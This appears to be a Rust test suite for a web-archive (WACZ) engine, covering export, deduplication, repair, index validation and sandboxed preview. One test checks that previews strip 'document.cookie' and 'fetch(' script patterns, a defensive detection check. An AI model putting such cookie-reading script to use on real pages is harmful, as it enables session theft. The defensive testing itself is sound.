    entries.push(("datapackage.json", manifest));
    write_zip(path, entries);
}
#[test]
fn archive_engine_export_preserves_shared_payloads_and_source() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source.wacz");
    let output = dir.path().join("compact.wacz");
    let blob = noise(128 * 1024);
    multi_fixture(&source,&[("https://example.test/keep","text/html",b"<html><body><h1>Keep</h1><div class='ad'>Sensitive omitted text</div><img src='/shared.png'></body></html>"),("https://example.test/drop","text/html",b"<h1>Drop</h1><img src='/shared.png'>"),("https://example.test/shared.png","image/png",b"shared captured image"),("https://tracker.test/blob","application/octet-stream",&blob)],"2026-01-01T00:00:00Z");
    let original = inspect_archive(&source).unwrap();
    let options = ExportOptions {
        include_urls: vec!["https://example.test/keep".into()],
        exclude_domains: vec!["tracker.test".into()],
        remove_selectors: vec!["body > div.ad".into()],
        ..Default::default()
    };
    let report = export_archive(&source, &output, &options).unwrap();
    assert!(verify_archive(&output).unwrap().valid);
    assert_eq!(report.pages.len(), 1);
    assert!(!report.pages[0].text.contains("Sensitive omitted"));
    assert!(report
        .resources
        .iter()
        .any(|r| r.url.ends_with("shared.png")));
    assert_eq!(inspect_archive(&source).unwrap().sha256, original.sha256);
    assert!(original.archive_bytes > report.archive_bytes + 100_000);
    println!(
        "compact fixture: {} -> {} bytes ({} saved)",
        original.archive_bytes,
        report.archive_bytes,
        original.archive_bytes - report.archive_bytes
    );
    assert!(export_archive(&source, &source, &options).is_err());
    assert!(export_archive(&source, &output, &options).is_err());
    let mut unsupported = options;
    unsupported.remove_selectors = vec!["div:has(script)".into()];
    assert!(export_archive(&source, &dir.path().join("bad.wacz"), &unsupported).is_err());
}
#[test]
fn archive_engine_cross_capture_revisits_rehydrate_without_parent() {
    // Risk: dependency-backed views must not disclose unbound archive bytes or
    // silently lose revisited HTML, and must leave source custody untouched.
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    let source = dir.path().join("source.wacz");
    let dedup = dir.path().join("dedup.wacz");
    let standalone = dir.path().join("standalone.wacz");
    let blob = noise(128 * 1024);
    multi_fixture(
        &parent,
        &[
            (
                "https://example.test/asset",
                "application/octet-stream",
                &blob,
            ),
            (
                "https://example.test/",
                "text/html",
                b"<h1>New content</h1>",
            ),
        ],
        "2026-01-01T00:00:00Z",
    );
    multi_fixture(
        &source,
        &[
            (
                "https://example.test/",
                "text/html",
                b"<h1>New content</h1>",
            ),
            (
                "https://example.test/asset",
                "application/octet-stream",
                &blob,
            ),
            (
                "https://example.test/new.css",
                "text/css",
                b"body {color:blue}",
            ),
        ],
        "2026-02-01T00:00:00Z",
    );
    let source_report = inspect_archive(&source).unwrap();
    let parent_report = inspect_archive(&parent).unwrap();
    let deps = vec![AuthorizedDependency {
        archive_id: "parent-id".into(),
        sha256: parent_report.sha256.clone(),
        authorized_local_path: parent.clone(),
    }];
    let report = deduplicate_archive(&source, &dedup, &deps).unwrap();
    assert_eq!(report.dependencies, vec!["parent-id"]);
    assert!(report.resources.iter().any(|r| r.url.ends_with("new.css")));
    assert!(!verify_archive(&dedup).unwrap().valid);
    assert!(report.archive_bytes + 100_000 < source_report.archive_bytes);
    let files_before = std::fs::read_dir(dir.path()).unwrap().count();
    assert!(preview_document(&dedup, "https://example.test/").is_err());
    assert!(reader_export(&dedup, "html").is_err());
    assert!(compare_archives(&source, &dedup).is_err());
    let mut denied = deps.clone();
    denied[0].archive_id = "unbound-id".into();
    assert!(preview_document_authorized(&dedup, "https://example.test/", &denied).is_err());
    assert!(reader_export_authorized(&dedup, "markdown", &denied).is_err());
    assert!(compare_archives_authorized(&source, &[], &dedup, &denied).is_err());
    denied = deps.clone();
    denied[0].sha256 = "0".repeat(64);
    assert!(preview_document_authorized(&dedup, "https://example.test/", &denied).is_err());
    assert!(reader_export_authorized(&dedup, "html", &denied).is_err());
    assert!(compare_archives_authorized(&dedup, &denied, &source, &[]).is_err());
    let preview = preview_document_authorized(&dedup, "https://example.test/", &deps).unwrap();
    assert!(preview.html.contains("New content"));
    assert!(reader_export_authorized(&dedup, "markdown", &deps)
        .unwrap()
        .contains("New content"));
    let comparison = compare_archives_authorized(&source, &[], &dedup, &deps).unwrap();
    assert!(comparison.changed_pages.is_empty());
    assert!(comparison.changed_resources.is_empty());
    assert_eq!(comparison.unchanged_pages, vec!["https://example.test/"]);
    assert_eq!(std::fs::read_dir(dir.path()).unwrap().count(), files_before);
    assert_eq!(
        inspect_archive(&source).unwrap().sha256,
        source_report.sha256
    );
    assert_eq!(inspect_archive(&dedup).unwrap().sha256, report.sha256);
    assert!(export_archive(&dedup, &standalone, &ExportOptions::default()).is_err());
    let output =
        materialize_archive(&dedup, &standalone, &deps, &ExportOptions::default()).unwrap();
    assert!(output.dependencies.is_empty());
    assert_eq!(
        output
            .resources
            .iter()
            .find(|r| r.url.ends_with("/asset"))
            .unwrap()
            .digest,
        source_report
            .resources
            .iter()
            .find(|r| r.url.ends_with("/asset"))
            .unwrap()
            .digest
    );
    std::fs::remove_file(&parent).unwrap();
    assert!(verify_archive(&standalone).unwrap().valid);
    println!(
        "cross-capture fixture: {} -> {} bytes ({} saved); standalone {}",
        source_report.archive_bytes,
        report.archive_bytes,
        source_report.archive_bytes - report.archive_bytes,
        output.archive_bytes
    );
    assert!(materialize_archive(
        &dedup,
        &dir.path().join("missing.wacz"),
        &deps,
        &ExportOptions::default()
    )
    .is_err());
}
#[test]
fn archive_engine_local_revisits_and_repair_do_not_drop_unrelated_pages() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    let patch = dir.path().join("patch.wacz");
    let repaired = dir.path().join("repaired.wacz");
    let compact = dir.path().join("dedup.wacz");
    let standalone = dir.path().join("standalone.wacz");
    let blob = noise(64 * 1024);
    multi_fixture(
        &parent,
        &[
            ("https://example.test/one", "text/html", b"<h1>Old</h1>"),
            (
                "https://example.test/two",
                "text/html",
                b"<h1>Retained</h1>",
            ),
            ("https://example.test/a", "application/octet-stream", &blob),
            ("https://example.test/b", "application/octet-stream", &blob),
        ],
        "2026-01-01T00:00:00Z",
    );
    let report = export_archive(
        &parent,
        &compact,
        &ExportOptions {
            deduplicate: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert!(report.dependencies.is_empty());
    assert!(verify_archive(&compact).unwrap().valid);
    let expanded =
        materialize_archive(&compact, &standalone, &[], &ExportOptions::default()).unwrap();
    assert_eq!(expanded.resources.len(), 4);
    multi_fixture(
        &patch,
        &[
            (
                "https://example.test/one",
                "text/html",
                b"<h1>Repaired</h1>",
            ),
            ("https://example.test/new.css", "text/css", b"h1{color:red}"),
        ],
        "2026-03-01T00:00:00Z",
    );
    let report = compose_repair(
        &parent,
        &patch,
        &repaired,
        &[],
        &["https://example.test/one".into()],
    )
    .unwrap();
    assert_eq!(report.pages.len(), 2);
    assert!(report.pages.iter().any(|p| p.text.contains("Retained")));
    assert!(report
        .pages
        .iter()
        .any(|p| p.text.contains("Repaired") && p.ts.starts_with("2026-03")));
    assert!(report.resources.iter().any(|r| r.url.ends_with("new.css")));
    assert!(verify_archive(&repaired).unwrap().valid);
}
#[test]
fn archive_engine_preview_and_reader_do_not_execute_archive_script() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let preview = preview_document(&path, "https://example.test/").unwrap();
    assert!(!preview.html.contains("document.cookie"));
    assert!(!preview.html.contains("fetch("));
    assert!(preview
        .content_security_policy
        .contains("sandbox allow-scripts"));
    assert!(!preview
        .content_security_policy
        .contains("allow-same-origin"));
    assert!(preview.html.contains("web-archives:selection"));
    assert_eq!(preview.html.matches("<script").count(), 1);
    assert!(preview.html.contains("data-archive-selector"));
    let dom = content::dom(preview.html.as_bytes()).unwrap();
    let mut nodes = vec![dom.document.clone()];
    let mut meta_in_head = false;
    while let Some(node) = nodes.pop() {
        if node.element_name().as_deref() == Some("meta")
            && content::attr(&node, "http-equiv").as_deref() == Some("Content-Security-Policy")
        {
            meta_in_head = node.get_parent().and_then(|p| p.element_name()).as_deref()
                == Some("head")
                && content::attr(&node, "content").as_deref()
                    == Some(preview.content_security_policy.as_str());
        }
        nodes.extend(node.children.borrow().iter().cloned());
    }
    assert!(meta_in_head, "Trusted policy must survive DOM roundtrip");
    let html = reader_export(&path, "html").unwrap();
    assert!(!html.contains("<script"));
    assert!(html.contains("Saved content"));
    assert!(html.contains("2026-01-02"));
}

#[test]
#[ignore = "requires WEB_ARCHIVES_FIXTURE pointing to an actual bounded crawler capture"]
fn archive_engine_real_crawler_derivative_corruption_check() {
    let source = std::path::PathBuf::from(
        std::env::var("WEB_ARCHIVES_FIXTURE").expect("actual fixture path"),
    );
    let dir = tempfile::tempdir().unwrap();
    let destination = std::env::var_os("WEB_ARCHIVES_OUTPUT")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| dir.path().join("derived.wacz"));
    let original = inspect_archive(&source).expect("actual crawler inspection");
    println!(
        "actual crawler input {} bytes, {} pages, {} resources, warnings {:?}",
        original.archive_bytes,
        original.pages.len(),
        original.resources.len(),
        original.warnings
    );
    let verification = verify_archive(&source).unwrap();
    assert!(verification.valid, "{verification:?}");
    let options = ExportOptions {
        remove_selectors: vec![".advert, .advertisement".into()],
        ..Default::default()
    };
    let report = export_archive(&source, &destination, &options).expect("actual crawler export");
    assert!(verify_archive(&destination).unwrap().valid);
    assert_eq!(inspect_archive(&source).unwrap().sha256, original.sha256);
    assert!(!report.pages.is_empty());
    assert_eq!(original.resources.len(), report.resources.len());
    assert!(!report
        .pages
        .iter()
        .any(|p| p.text.contains("Advertisement region")));
    println!(
        "actual crawler export {} -> {} bytes: {}",
        original.archive_bytes,
        report.archive_bytes,
        destination.display()
    );
    let preview = preview_document(&source, &original.pages[0].url).unwrap();
    assert_eq!(preview.html.matches("<script").count(), 1);
    assert!(reader_export(&source, "html").unwrap().contains("Capture:"));
    if let Some(parent) = std::env::var_os("WEB_ARCHIVES_PARENT") {
        let parent = std::path::PathBuf::from(parent);
        let parent_hash = inspect_archive(&parent).unwrap().sha256;
        let inputs = [AuthorizedDependency {
            archive_id: "parent".into(),
            sha256: parent_hash.clone(),
            authorized_local_path: parent.clone(),
        }];
        let dependent = dir.path().join("native-dependent.wacz");
        let report = deduplicate_archive(&source, &dependent, &inputs).unwrap();
        assert_eq!(report.dependencies, vec!["parent"]);
        let mut zip = zip::ZipArchive::new(std::fs::File::open(&dependent).unwrap()).unwrap();
        let manifest: serde_json::Value =
            serde_json::from_reader(zip.by_name("datapackage.json").unwrap()).unwrap();
        assert_eq!(
            manifest["relation"]["requires"],
            serde_json::json!([{"filename":"parent.wacz","hash":format!("sha256:{parent_hash}")}])
        );
        drop(zip);
        let standalone = dir.path().join("native-materialized.wacz");
        let materialized =
            materialize_archive(&dependent, &standalone, &inputs, &ExportOptions::default())
                .unwrap();
        assert!(verify_archive(&standalone).unwrap().valid);
        assert_eq!(original.resources.len(), materialized.resources.len());
        assert_eq!(inspect_archive(&source).unwrap().sha256, original.sha256);
        assert_eq!(inspect_archive(&parent).unwrap().sha256, parent_hash);
        println!("actual native pair: {} bytes -> dependent {} bytes -> materialized {} bytes; standard relation parent.wacz; both originals unchanged", original.archive_bytes, report.archive_bytes, materialized.archive_bytes);
    }
}

#[test]
fn archive_engine_lazy_payload_rejects_source_mutation() {
    use std::io::{Read, Seek, SeekFrom};
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("source.wacz");
    fixture(&path);
    let archive = read::load(&path).unwrap();
    let source = archive.records[0].source.as_ref().unwrap();
    let offset = source.start + source.compressed_length / 2;
    let mut file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&path)
        .unwrap();
    file.seek(SeekFrom::Start(offset)).unwrap();
    let mut byte = [0];
    file.read_exact(&mut byte).unwrap();
    byte[0] ^= 0x7f;
    file.seek(SeekFrom::Start(offset)).unwrap();
    file.write_all(&byte).unwrap();
    file.sync_all().unwrap();
    assert!(archive.records[0]
        .eager_body_limited(read::MAX_RECORD)
        .is_err());
}

#[test]
fn archive_engine_thousands_of_revisits_materialize_without_payload_loss() {
    // Risk: common assets across thousands of pages must not produce a corrupt
    // derivative or hit an accidental quadratic resolver cutoff at publication.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("many.wacz");
    let dedup = dir.path().join("dedup.wacz");
    let standalone = dir.path().join("standalone.wacz");
    let urls: Vec<_> = (0..3000)
        .map(|i| format!("https://example.test/assets/{i}"))
        .collect();
    let mut entries = vec![(
        "https://example.test/",
        "text/html",
        &b"<h1>Many resources</h1>"[..],
    )];
    entries.extend(urls.iter().map(|url| {
        (
            url.as_str(),
            "application/octet-stream",
            &b"Repeated captured asset payload"[..],
        )
    }));
    multi_fixture(&source, &entries, "2026-01-01T00:00:00Z");
    let report = export_archive(
        &source,
        &dedup,
        &ExportOptions {
            deduplicate: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(report.resources.len(), 3001);
    assert!(report.dependencies.is_empty());
    let report = materialize_archive(&dedup, &standalone, &[], &ExportOptions::default()).unwrap();
    assert_eq!(report.resources.len(), 3001);
    assert!(verify_archive(&standalone).unwrap().valid);
    let expected = format!("sha256:{}", read::hash(b"Repeated captured asset payload"));
    assert!(report
        .resources
        .iter()
        .filter(|r| r.mime == "application/octet-stream")
        .all(|r| r.digest == expected));
}

#[test]
fn archive_engine_compressed_index_rejects_truncated_or_missing_blocks() {
    // Risk: a manifest-valid archive with broken random-access index ranges
    // publishes successfully but loses offline access to its captured records.
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.wacz");
    fixture(&path);
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&path).unwrap()).unwrap();
    let mut originals = vec![];
    for i in 0..zip.len() {
        let mut file = zip.by_index(i).unwrap();
        let name = file.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut file, &mut bytes).unwrap();
        if name != "datapackage.json" {
            originals.push((name, bytes));
        }
    }
    drop(zip);
    let cdx = originals
        .iter()
        .find(|(n, _)| n == "indexes/index.cdxj")
        .unwrap()
        .1
        .clone();
    let line = std::str::from_utf8(&cdx).unwrap().lines().next().unwrap();
    let prefix = line[..line.find('{').unwrap()].trim_end();
    let mut encoder = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
    encoder.write_all(&cdx).unwrap();
    let compressed = encoder.finish().unwrap();
    for (name, with_index, length) in [
        ("valid.wacz", true, compressed.len()),
        ("truncated.wacz", true, compressed.len() - 1),
        ("missing.wacz", false, compressed.len()),
    ] {
        let mut entries: Vec<_> = originals
            .iter()
            .filter(|(n, _)| n != "indexes/index.cdxj")
            .cloned()
            .collect();
        entries.push(("indexes/index.cdx.gz".into(), compressed.clone()));
        if with_index {
            entries.push(("indexes/index.idx".into(),format!("{prefix} {}\n",serde_json::json!({"filename":"index.cdx.gz","offset":0,"length":length,"digest":format!("sha256:{}",read::hash(&compressed))})).into_bytes()));
        }
        let resources:Vec<_>=entries.iter().map(|(path,bytes)|serde_json::json!({"path":path,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
        entries.push((
            "datapackage.json".into(),
            serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
        ));
        let borrowed = entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect();
        let destination = dir.path().join(name);
        write_zip(&destination, borrowed);
        if name == "valid.wacz" {
            assert!(verify_archive(&destination).unwrap().valid);
        } else {
            assert!(inspect_archive(&destination).is_err());
        }
    }
    assert_eq!(
        read::normalize_sha256("sha256:6QAW7PDTIV5WD6ACG37BHQKHLPDISHGFSVMYV2T4XRIYWNSF4VQQ")
            .unwrap(),
        "sha256:f4016fbc73457b61f80236fe13c1475bc6891cc595598aea7cbc518b3645e561"
    );
}

#[test]
fn archive_engine_selector_dedupe_does_not_leave_removed_text_in_metadata() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source.wacz");
    let output = dir.path().join("derived.wacz");
    let html=&b"<html><body><h1>Retained story</h1><p class=secret>Removed confidential text</p></body></html>"[..];
    multi_fixture(
        &source,
        &[
            ("https://example.test/a", "text/html", html),
            ("https://example.test/b", "text/html", html),
        ],
        "2026-01-01T00:00:00Z",
    );
    let report = export_archive(
        &source,
        &output,
        &ExportOptions {
            deduplicate: true,
            remove_selectors: vec!["p.secret".into()],
            ..Default::default()
        },
    )
    .unwrap();
    assert!(report
        .pages
        .iter()
        .all(|p| p.text.contains("Retained story") && !p.text.contains("Removed confidential")));
    assert!(verify_archive(&output).unwrap().valid);
    let mut zip = zip::ZipArchive::new(std::fs::File::open(output).unwrap()).unwrap();
    let mut pages = String::new();
    std::io::Read::read_to_string(&mut zip.by_name("pages/pages.jsonl").unwrap(), &mut pages)
        .unwrap();
    assert!(!pages.contains("Removed confidential"));
}

#[test]
fn archive_engine_large_spa_html_preserves_original_and_crawler_baseline() {
    // Risk: optional text extraction must not prevent publication or silently
    // corrupt/drop a legal large SPA document and its archived dependencies.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("large-spa.wacz");
    let output = dir.path().join("retained.wacz");
    let mut html = b"<html><body><h1>SPA shell</h1><script type=application/json>\"".to_vec();
    html.extend(std::iter::repeat_n(b'x', 3 * 1024 * 1024));
    html.extend_from_slice(b"\"</script><link rel=stylesheet href='/shared.css'></body></html>");
    multi_fixture(
        &source,
        &[
            ("https://example.test/spa", "text/html", &html),
            (
                "https://example.test/shared.css",
                "text/css",
                b"body{color:navy}",
            ),
        ],
        "2026-01-01T00:00:00Z",
    );
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&source).unwrap()).unwrap();
    let mut entries = vec![];
    for i in 0..zip.len() {
        let mut file = zip.by_index(i).unwrap();
        let name = file.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut file, &mut bytes).unwrap();
        if name != "datapackage.json" {
            entries.push((name, bytes));
        }
    }
    drop(zip);
    let baseline = "Captured browser SPA baseline";
    entries.iter_mut().find(|(name,_)|name=="pages/pages.jsonl").unwrap().1=format!("{{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}}\n{}\n",serde_json::json!({"url":"https://example.test/spa","title":"Browser title","ts":"2026-01-01T00:00:00Z","text":baseline})).into_bytes();
    let resources:Vec<_>=entries.iter().map(|(path,bytes)|serde_json::json!({"path":path,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    entries.push((
        "datapackage.json".into(),
        serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
    ));
    write_zip(
        &source,
        entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect(),
    );
    let report = inspect_archive(&source).unwrap();
    assert_eq!(report.pages[0].text, baseline);
    assert!(report
        .warnings
        .iter()
        .any(|w| w.contains("analysis omitted")));
    assert!(verify_archive(&source).unwrap().valid);
    let derived = export_archive(&source, &output, &ExportOptions::default()).unwrap();
    assert_eq!(derived.resources.len(), 2);
    assert_eq!(derived.resources[0].digest, report.resources[0].digest);
    assert_eq!(derived.pages[0].text, baseline);
    assert!(verify_archive(&output).unwrap().valid);
    assert!(reader_export(&source, "markdown")
        .unwrap()
        .contains(baseline));
    assert!(preview_document(&source, "https://example.test/spa").is_err());
    let unsupported = dir.path().join("unsupported.wacz");
    assert!(export_archive(
        &source,
        &unsupported,
        &ExportOptions {
            remove_selectors: vec![".ad".into()],
            ..Default::default()
        }
    )
    .is_err());
    assert!(!unsupported.exists());
}

#[test]
fn archive_engine_rendered_baseline_survives_subsecond_response_merge() {
    // Demonstrated profile-capture regression: JavaScript-rendered account text
    // was replaced with the pre-render response shell and an extra page row.
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("rendered.wacz");
    let output = dir.path().join("standalone.wacz");
    multi_fixture(&source,&[("https://example.test/account","text/html",b"<html><head><title>Shell title</title></head><body><div id=root>Response shell</div><script>document.querySelector('#root').textContent='Rendered account';</script></body></html>")],"2026-01-01T00:00:00Z");
    let mut zip = zip::ZipArchive::new(std::fs::File::open(&source).unwrap()).unwrap();
    let mut entries = vec![];
    for i in 0..zip.len() {
        let mut file = zip.by_index(i).unwrap();
        let name = file.name().to_owned();
        let mut bytes = vec![];
        std::io::Read::read_to_end(&mut file, &mut bytes).unwrap();
        if name != "datapackage.json" {
            entries.push((name, bytes));
        }
    }
    drop(zip);
    let baseline = "Rendered authenticated account details";
    let ts = "2026-01-01T00:00:00.500Z";
    entries.iter_mut().find(|(name,_)|name=="pages/pages.jsonl").unwrap().1=format!("{{\"format\":\"json-pages-1.0\",\"id\":\"pages\"}}\n{}\n",serde_json::json!({"id":"native-page-id","url":"https://example.test/account","title":"Rendered private dashboard","ts":ts,"text":baseline})).into_bytes();
    let resources:Vec<_>=entries.iter().map(|(path,bytes)|serde_json::json!({"path":path,"bytes":bytes.len(),"hash":format!("sha256:{}",read::hash(bytes))})).collect();
    entries.push((
        "datapackage.json".into(),
        serde_json::to_vec(&serde_json::json!({"resources":resources})).unwrap(),
    ));
    write_zip(
        &source,
        entries
            .iter()
            .map(|(n, b)| (n.as_str(), b.clone()))
            .collect(),
    );
    for report in [
        inspect_archive(&source).unwrap(),
        export_archive(&source, &output, &ExportOptions::default()).unwrap(),
    ] {
        assert_eq!(report.pages.len(), 1);
        assert_eq!(report.pages[0].text, baseline);
        assert_eq!(report.pages[0].title, "Rendered private dashboard");
        assert_eq!(report.pages[0].ts, ts);
    }
    assert!(reader_export(&output, "markdown")
        .unwrap()
        .contains(baseline));
    assert!(verify_archive(&output).unwrap().valid);

    // WA-ENG-003 round 2 must retain this genuine same-capture native baseline
    // during repair too, including when other parent pages keep inference off.
    let parent = dir.path().join("parent.wacz");
    fixture(&parent);
    let repaired = dir.path().join("repaired.wacz");
    let report = compose_repair(
        &parent,
        &source,
        &repaired,
        &[],
        &["https://example.test/account".into()],
    )
    .unwrap();
    let page = report
        .pages
        .iter()
        .find(|p| p.url.ends_with("/account"))
        .unwrap();
    assert_eq!(page.text, baseline);
    assert_eq!(page.title, "Rendered private dashboard");
    assert_eq!(page.ts, ts);
    assert!(!report
        .warnings
        .iter()
        .any(|w| w.contains("native page metadata")));
    assert!(verify_archive(&repaired).unwrap().valid);
}

#[test]
fn archive_engine_repair_native_baseline_requires_unambiguous_capture_identity() {
    // Preservation regression: matching URL and a nearby date must not defeat
    // an explicit mismatched page ID or select between distinct requests.
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().join("parent.wacz");
    fixture(&parent);
    for (case, page_id, ts, expected_native) in [
        ("matching", "actual-page", "2026-02-01T00:00:02Z", true),
        (
            "conflicting",
            "different-page",
            "2026-02-01T00:00:00.500Z",
            false,
        ),
        ("ambiguous-requests", "", "2026-02-01T00:00:00.500Z", false),
        ("ambiguous-subsecond", "", "2026-02-01T00:00:00.100Z", false),
        (
            "ambiguous-page-rows",
            "different-page",
            "2026-02-01T00:00:00Z",
            false,
        ),
        (
            "failed-status",
            "actual-page",
            "2026-02-01T00:00:00Z",
            false,
        ),
    ] {
        let patch = dir.path().join(format!("{case}.wacz"));
        let mut captures = vec![(
            "https://example.test/account",
            "text/html",
            b"<title>Successful title</title><h1>Successful body</h1>".as_slice(),
            "2026-02-01T00:00:00Z",
            200,
            true,
        )];
        if case == "ambiguous-requests" {
            captures.push(captures[0]);
        } else if case == "ambiguous-subsecond" {
            let mut failure = captures[0];
            failure.3 = "2026-02-01T00:00:00.300Z";
            failure.4 = 500;
            captures.push(failure);
        }
        capture_fixture(&patch, &captures);
        rewrite_package(&patch, |entries| {
            if case == "ambiguous-requests" {
                let index = std::str::from_utf8(&entries["indexes/index.cdxj"]).unwrap();
                let mut rows = vec![];
                for (i, line) in index.lines().enumerate() {
                    let start = line.find('{').unwrap();
                    let mut row: serde_json::Value = serde_json::from_str(&line[start..]).unwrap();
                    row["method"] = serde_json::json!("POST");
                    row["requestBody"] = serde_json::json!(format!("variant={i}"));
                    rows.push(format!(
                        "test,example)/account?__wb_method=post&variant={i} 20260201000000 {row}\n"
                    ));
                }
                rows.sort_unstable();
                entries.insert("indexes/index.cdxj".into(), rows.concat().into_bytes());
            } else if case != "ambiguous-subsecond" {
                // One response: add native identity while retaining exact CDX
                // span fixity, without depending on production capture helpers.
                let raw = read::bounded(
                    flate2::read::MultiGzDecoder::new(
                        entries["archive/capture.warc.gz"].as_slice(),
                    ),
                    64 * 1024,
                )
                .unwrap();
                let raw = String::from_utf8(raw).unwrap().replacen(
                    "WARC/1.1\r\n",
                    "WARC/1.1\r\nWARC-Page-ID: actual-page\r\n",
                    1,
                );
                let mut enc = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
                enc.write_all(raw.as_bytes()).unwrap();
                let data = enc.finish().unwrap();
                let index = std::str::from_utf8(&entries["indexes/index.cdxj"]).unwrap();
                let start = index.find('{').unwrap();
                let mut row: serde_json::Value = serde_json::from_str(&index[start..]).unwrap();
                row["length"] = serde_json::json!(data.len());
                entries.insert(
                    "indexes/index.cdxj".into(),
                    format!("{}{}\n", &index[..start], row).into_bytes(),
                );
                entries.insert("archive/capture.warc.gz".into(), data);
            }
            let mut pages = format!(
                "{{\"format\":\"json-pages-1.0\"}}\n{}\n",
                serde_json::json!({"id":page_id,"url":"https://example.test/account","ts":ts,"title":"Native title","text":"Native rendered baseline","status":if case=="failed-status" {500} else {200}})
            );
            if case == "ambiguous-page-rows" {
                // The conflicting row must not borrow this later row's ID from
                // the inventory's URL/date lookup, even if this row is failed.
                pages.push_str(&format!("{}\n", serde_json::json!({"id":"actual-page","url":"https://example.test/account","ts":ts,"title":"Failed native title","text":"Failed native baseline","status":500})));
            }
            entries.insert("pages/pages.jsonl".into(), pages.into_bytes());
        });
        let before = inspect_archive(&patch).unwrap().sha256;
        let output = dir.path().join(format!("{case}-repaired.wacz"));
        let report = compose_repair(
            &parent,
            &patch,
            &output,
            &[],
            &["https://example.test/account".into()],
        )
        .unwrap();
        let page = report
            .pages
            .iter()
            .find(|p| p.url.ends_with("/account"))
            .unwrap();
        let reader = reader_export(&output, "html").unwrap();
        if expected_native {
            assert_eq!(page.text, "Native rendered baseline", "{case}");
            assert_eq!(page.title, "Native title");
            assert_eq!(page.ts, ts);
            assert!(reader.contains("Native rendered baseline"));
        } else {
            assert!(!reader.contains("Native rendered baseline"), "{case}");
            assert!(reader.contains("Successful body"));
            assert_eq!(page.title, "Successful title");
            assert_eq!(page.ts, "2026-02-01T00:00:00Z");
        }
        assert_eq!(
            report
                .warnings
                .iter()
                .any(|w| w.contains("native page metadata")),
            !expected_native
        );
        let mut zip = zip::ZipArchive::new(std::fs::File::open(&output).unwrap()).unwrap();
        let provenance: serde_json::Value =
            serde_json::from_reader(zip.by_name("provenance.json").unwrap()).unwrap();
        assert_eq!(provenance["mixedCaptureTimes"], true);
        assert_eq!(
            provenance["pageMetadataFallbacks"].as_u64().unwrap() > 0,
            !expected_native
        );
        assert!(verify_archive(&output).unwrap().valid);
        assert_eq!(inspect_archive(&patch).unwrap().sha256, before);
    }
}
